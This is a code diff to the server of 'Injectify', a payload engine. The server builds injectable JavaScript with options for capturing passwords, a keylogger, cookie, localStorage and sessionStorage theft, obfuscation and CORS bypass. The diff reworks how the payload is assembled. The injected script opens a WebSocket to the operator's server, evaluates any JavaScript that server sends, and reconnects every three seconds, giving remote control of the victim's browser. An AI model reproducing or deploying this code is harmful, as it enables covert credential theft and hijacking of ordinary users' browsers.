@@ -1961,6 +1961,31 @@ MongoClient.connect(config.mongodb, function (err, db) {
 
     let injectProject = btoa(req.query.project)
     if (req.query.debug === 'true') injectProject = '$' + injectProject
+    let help = `
+    // ┌─────────────────────────────────────┐
+    // │     Injectify payload engine ©      │
+    // │   INTELLECTUAL PROPERTY OF SAMDD    │
+    // ├────────────────┬─────────┬──────────┤
+    // │ GET_PARAM      │ TYPE    │ DEFAULT  │
+    // ├────────────────┼─────────┼──────────┤
+    // │ project        │ STRING  │ REQUIRED │
+    // │ proxy          │ URL     │ NONE     │
+    // │ base64         │ BOOLEAN │ TRUE     │
+    // │ obfuscate      │ BOOLEAN │ FALSE    │
+    // │ minify         │ BOOLEAN │ FALSE    │
+    // │ comments       │ BOOLEAN │ FALSE    │
+    // | debug          | BOOLEAN | FALSE    |
+    // | bypassCors     | BOOLEAN | FALSE    |
+    // │                │         │          │
+    // | inject         │ BOOLEAN │ FALSE    |
+    // | passwords      │ BOOLEAN │ TRUE     |
+    // | keylogger      │ BOOLEAN │ FALSE    |
+    // │ screenSize     │ BOOLEAN │ TRUE     │
+    // │ location       │ BOOLEAN │ TRUE     │
+    // │ localStorage   │ BOOLEAN │ TRUE     │
+    // │ sessionStorage │ BOOLEAN │ TRUE     │
+    // │ cookies        │ BOOLEAN │ TRUE     │
+    // └────────────────┴─────────┴──────────┘`
 
     if (valid) {
       res.setHeader('Content-Type', 'application/javascript')
@@ -1969,28 +1994,32 @@ MongoClient.connect(config.mongodb, function (err, db) {
       let json = ''
       let body = ''
       let catcher = ''
+      let injectScript
 
       if (inject) {
+        let websocket = "'"+ wss + "'+p+'i/websocket?" + injectProject + "'"
+        if (req.query.passwords === 'false' && keylogger === false) websocket = "'" + wss + proxy + "i/websocket?" + injectProject + "'"
         body += `
-        function u() {` + comment('Open a new websocket to the server') + `
-          window.ws = new WebSocket('`+ wss + `'+p+'i/websocket?` + injectProject + `')
-          ws.onmessage = function(d) {
-              try {` + comment('Parse the websocket message as JSON') + `
-                  d = JSON.parse(d.data)` + comment('Evaluate the javascript') + `
-                  eval(d.d)
-              } catch(e) {` + comment('On error send error back to server') + `
-                  ws.send(JSON.stringify({
-                      t: 'e',
-                      d: e,
-                  }))
-              }
+          function u() {` + comment('Open a new websocket to the server') + `
+            window.ws = new WebSocket(` + websocket + `)
+            ws.onmessage = function(d) {
+                try {` + comment('Parse the websocket message as JSON') + `
+                    d = JSON.parse(d.data)` + comment('Evaluate the javascript') + `
+                    eval(d.d)
+                } catch(e) {` + comment('On error send error back to server') + `
+                    ws.send(JSON.stringify({
+                        t: 'e',
+                        d: e,
+                    }))
+                }
+            }
+            ws.onclose = function() {` + comment('Attempt to re-open the websocket, retrying every 3 seconds') + `
+                setTimeout(u, 3000)
+            }
           }
-          ws.onclose = function() {` + comment('Attempt to re-open the websocket, retrying every 3 seconds') + `
-              setTimeout(u, 3000)
-          }
-      }
-      u()
-      `
+          u()
+        `
+        injectScript = body
       }
       if (keylogger) {
         variables += 'm = {}, f = [], g = new Date().getTime(),'
@@ -2047,31 +2076,14 @@ MongoClient.connect(config.mongodb, function (err, db) {
         }
       }
 
-      let script = `
-        // ┌─────────────────────────────────────┐
-        // │     Injectify payload engine ©      │
-        // │   INTELLECTUAL PROPERTY OF SAMDD    │
-        // ├────────────────┬─────────┬──────────┤
-        // │ GET_PARAM      │ TYPE    │ DEFAULT  │
-        // ├────────────────┼─────────┼──────────┤
-        // │ project        │ STRING  │ REQUIRED │
-        // │ proxy          │ URL     │ NONE     │
-        // │ base64         │ BOOLEAN │ TRUE     │
-        // │ obfuscate      │ BOOLEAN │ FALSE    │
-        // │ minify         │ BOOLEAN │ FALSE    │
-        // │ comments       │ BOOLEAN │ FALSE    │
-        // | debug          | BOOLEAN | FALSE    |
-        // | bypassCors     | BOOLEAN | FALSE    |
-        // │                │         │          │
-        // | inject         │ BOOLEAN │ FALSE    |
-        // | passwords      │ BOOLEAN │ TRUE     |
-        // | keylogger      │ BOOLEAN │ FALSE    |
-        // │ screenSize     │ BOOLEAN │ TRUE     │
-        // │ location       │ BOOLEAN │ TRUE     │
-        // │ localStorage   │ BOOLEAN │ TRUE     │
-        // │ sessionStorage │ BOOLEAN │ TRUE     │
-        // │ cookies        │ BOOLEAN │ TRUE     │
-        // └────────────────┴─────────┴──────────┘
+      let script = help + `
+      //  Project name    | ` + req.query.project + `
+
+
+      ` + injectScript
+      console.log(req.query.passwords, keylogger)
+      if (!(req.query.passwords == 'false' && keylogger == false)) {
+        script = help + `
         //  Project name    | ` + req.query.project + `
 
 
@@ -2135,6 +2147,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
             })`
           )
         /// ////////////////////////////////////////////////////////////////////////
+      }
 
       if (req.query.obfuscate === 'true') {
         ObfuscateJS(script, {
@@ -2158,32 +2171,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
       }
     } else {
       res.setHeader('Content-Type', 'application/javascript')
-      let script = `
-      // ┌─────────────────────────────────────┐
-      // │     Injectify payload engine ©      │
-      // │   INTELLECTUAL PROPERTY OF SAMDD    │
-      // ├────────────────┬─────────┬──────────┤
-      // │ GET_PARAM      │ TYPE    │ DEFAULT  │
-      // ├────────────────┼─────────┼──────────┤
-      // │ project        │ STRING  │ REQUIRED │
-      // │ proxy          │ URL     │ NONE     │
-      // │ base64         │ BOOLEAN │ TRUE     │
-      // │ obfuscate      │ BOOLEAN │ FALSE    │
-      // │ minify         │ BOOLEAN │ FALSE    │
-      // │ comments       │ BOOLEAN │ FALSE    │
-      // | debug          | BOOLEAN | FALSE    |
-      // | bypassCors     | BOOLEAN | FALSE    |
-      // │                │         │          │
-      // | inject         │ BOOLEAN │ FALSE    |
-      // | passwords      │ BOOLEAN │ TRUE     |
-      // | keylogger      │ BOOLEAN │ FALSE    |
-      // │ screenSize     │ BOOLEAN │ TRUE     │
-      // │ location       │ BOOLEAN │ TRUE     │
-      // │ localStorage   │ BOOLEAN │ TRUE     │
-      // │ sessionStorage │ BOOLEAN │ TRUE     │
-      // │ cookies        │ BOOLEAN │ TRUE     │
-      // └────────────────┴─────────┴──────────┘
-      `
+      let script = help
       res.send(
         beautify(script, {
           indent_size: 2
